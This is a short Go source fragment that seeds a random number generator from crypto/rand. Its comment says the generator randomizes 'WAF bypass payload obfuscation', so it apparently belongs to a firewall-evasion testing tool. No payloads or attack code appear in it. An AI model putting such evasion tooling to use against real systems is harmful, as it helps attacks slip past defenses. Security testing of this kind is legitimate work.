// rng is a local random source seeded from crypto/rand to ensure
// non-deterministic WAF bypass payload obfuscation.
var rng = newSeededRand()

func newSeededRand() *rand.Rand {
	var seed int64
	_ = binary.Read(crand.Reader, binary.BigEndian, &seed)
	return rand.New(rand.NewSource(seed))
}

